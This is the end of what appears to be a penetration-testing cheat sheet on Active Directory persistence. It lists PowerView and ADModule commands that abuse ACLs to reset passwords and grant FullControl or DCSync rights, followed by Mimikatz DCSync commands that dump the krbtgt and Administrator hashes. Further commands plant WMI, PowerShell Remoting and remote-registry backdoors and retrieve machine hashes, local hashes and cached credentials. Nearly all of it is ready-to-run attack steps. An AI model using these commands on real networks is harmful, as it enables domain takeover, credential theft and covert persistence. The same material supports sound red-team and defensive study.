<h2 id="abusing-resetpassword-acl">Abusing ResetPassword ACL</h2>

<ul>
  <li>PowerView:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-DomainUserPassword -Identity user2 -AccountPassword <span class="o">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"Password123!"</span> -AsPlainText -Force<span class="o">)</span> -Verbose
</code></pre></div>    </div>
  </li>
  <li>ADModule:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-ADACcountPassword</span> -Identity user2 -NewPassword <span class="o">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"Password123!"</span> -AsPlainText -Force<span class="o">)</span> -Verbose
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="abusing-fullcontrol-acl-in-domain-root">Abusing FullControl ACL in domain root</h2>

<p>There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl.</p>

<p>First, add full control rights:</p>

<ul>
  <li>PowerView:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetDistinguishedName <span class="s1">'DC=corp,DC=local'</span> -PrincipalSamAccountName user1 -Rights All -Verbose
</code></pre></div>    </div>
  </li>
  <li>ADModule:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'DC=corp,DC=local'</span> -Principal user1 -Verbose
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="abusing-dcsync-in-domain-root">Abusing DCSync in domain root</h2>

<p>There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like the ability to run <code class="highlighter-rouge">DCSync</code>.</p>

<ul>
  <li>PowerView:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetDistinguishedName <span class="s1">'DC=corp,DC=local'</span> -PrincipalSamAccountName user1 -Rights DCSync -Verbose
</code></pre></div>    </div>
  </li>
  <li>ADModule:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'DC=corp,DC=local'</span> -Principal user1 -GUIDRight DCSync -Verbose
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p><strong>Note</strong>: There are three special rights which are required to DCSync:</p>

  <p><code class="highlighter-rouge">Replicating Directory Changes</code>, <code class="highlighter-rouge">Replicating Directory Changes All</code> and <code class="highlighter-rouge">Replicating Directory Changes In Filtered Set</code>.</p>
</blockquote>

<p>And then execute DCSync:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\krbtgt"'</span>
Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\Administrator"'</span>
</code></pre></div></div>
<p>So once we have obtained the hash NTLM of <em>any user</em> of the domain, <code class="highlighter-rouge">PassTheHash</code> or <code class="highlighter-rouge">Over-PassTheHash</code> attack can be executed.</p>

<h2 id="security-descriptors">Security Descriptors</h2>

<p>It is possible to modify Security Descriptors such as security information like owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users.</p>

<p>It is a very useful backdoor mechanism but administrative privileges are required.</p>

<p>Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL.</p>

<p><code class="highlighter-rouge">ace\_type;ace\_flags;rights;object_guid;inherit\_object\_guid;account\_sid</code></p>

<p>ACE for built-in administrators for WMI namespaces</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A;CI;CCDCLCSWRPWPRCWD;;;&lt;SID&gt;
</code></pre></div></div>

<h3 id="wmi">WMI</h3>

<p>ACLs can be modified to allow non-admin users access to securable objects with <code class="highlighter-rouge">Set-RemoteWMI.ps1</code>:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Set-RemoteWMI.ps1
</code></pre></div></div>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-RemoteWMI -UserName user1 -Verbose
<span class="nb">Set</span>-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace <span class="s1">'root\cimv2'</span> -Verbose
<span class="nb">Set</span>-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -Credential Administrator -namespace <span class="s1">'root\cimv2'</span> -Verbose
</code></pre></div></div>
<p>And to remove permissions:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace <span class="s1">'root\cimv2'</span> -Remove -Verbose
</code></pre></div></div>

<h3 id="powershell-remoting">PowerShell Remoting</h3>

<p>Something similar we can do it with PowerShell Remoting with the script <code class="highlighter-rouge">Set-RemotePSRemoting.ps1</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Set-RemotePSRemoting.ps1

<span class="nb">Set</span>-RemotePSRemoting -UserName user1 -Verbose
<span class="nb">Set</span>-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Verbose
<span class="nb">Set</span>-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove
</code></pre></div></div>

<h3 id="remote-registry">Remote Registry</h3>

<p>Using DAMP we can modify the registry with administrative privileges.</p>

<p>On a remote machine with <code class="highlighter-rouge">Add-RemoteRegBackdoor.ps1</code> script.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Add-RemoteRegBackdoor.ps1
Add-RemoteRegBackdoor -ComputerName dc01.corp.local -Trustee user1 -Verbose
</code></pre></div></div>
<p>After that we can execute some interesting attacks such as getting accounts and machines hashes.</p>

<ul>
  <li>Retrive machine account hash:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteMachineAccountHash
Get-RemoteMachineAccountHash -ComputerName dc01.corp.local -Verbose
</code></pre></div>    </div>
  </li>
  <li>Retrieve local account hash:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteLocalAccountHash
Get-RemoteLocalAccountHash -ComputerName dc01.corp.local -Verbose
</code></pre></div>    </div>
  </li>
  <li>Retrive domain cached credentials:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteCachedCredentials
Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose
</code></pre></div>    </div>
  </li>
</ul>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
